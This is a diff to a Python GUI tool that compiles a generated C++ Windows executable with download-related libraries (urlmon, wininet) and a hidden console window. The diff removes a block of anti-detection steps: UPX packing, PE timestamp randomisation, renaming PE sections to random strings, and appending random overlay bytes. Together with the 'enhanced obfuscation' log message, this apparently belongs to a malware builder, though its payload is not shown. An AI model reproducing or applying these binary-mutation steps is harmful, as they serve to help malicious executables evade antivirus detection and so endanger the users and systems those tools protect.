@@ -605,7 +605,8 @@ class GUI:
                 str(tmp_cpp), "-o", str(exe_path),
                 "-lurlmon", "-lwininet", "-lshlwapi",
                 "-lshell32", "-ladvapi32", "-lole32",
-                "-mwindows"
+                "-mwindows",
+                "-lcrypt32"
             ]
 
         try:
@@ -626,53 +627,6 @@ class GUI:
                 break
         else:
             log.warning("strip not found – skipping symbol stripping")
-
-        # 4. UPX pack
-        if shutil.which("upx"):
-            try:
-                subprocess.run(
-                    ["upx", "-9", "--lzma", "--overlay=copy", str(exe_path)],
-                    check=True
-                )
-                log.info("Packed with UPX")
-            except Exception as e:
-                log.warning("UPX packing failed: %s", e)
-        else:
-            log.warning("upx not found – skipping UPX packing")
-
-        # 5. PE header timestamp mutation
-        if pefile:
-            try:
-                pe = pefile.PE(str(exe_path))
-                pe.FILE_HEADER.TimeDateStamp = random.randint(0, 0xFFFFFFFF)
-                pe.write(str(exe_path))
-                log.info("Mutated PE TimeDateStamp field")
-            except Exception as e:
-                log.warning("PE timestamp tweak failed: %s", e)
-        else:
-            log.warning("pefile not installed – skipping PE mutation")
-
-        # 6. Rename PE sections
-        if lief:
-            try:
-                binary = lief.parse(str(exe_path))
-                for section in binary.sections:
-                    section.name = ''.join(random.choices(string.ascii_letters, k=8))
-                binary.write(str(exe_path))
-                log.info("Renamed PE sections")
-            except Exception as e:
-                log.warning("Section renaming failed: %s", e)
-        else:
-            log.warning("lief not installed – skipping section renaming")
-
-        # 7. overlay junk bytes
-        try:
-            overlay_len = random.randint(1024, 4096)
-            with open(exe_path, "ab") as fh:
-                fh.write(os.urandom(overlay_len))
-            log.info("Appended %d random bytes to overlay", overlay_len)
-        except Exception as e:
-            log.warning("Overlay append failed: %s", e)
 
         log.info("✔ Build w/ enhanced obfuscation complete")
 
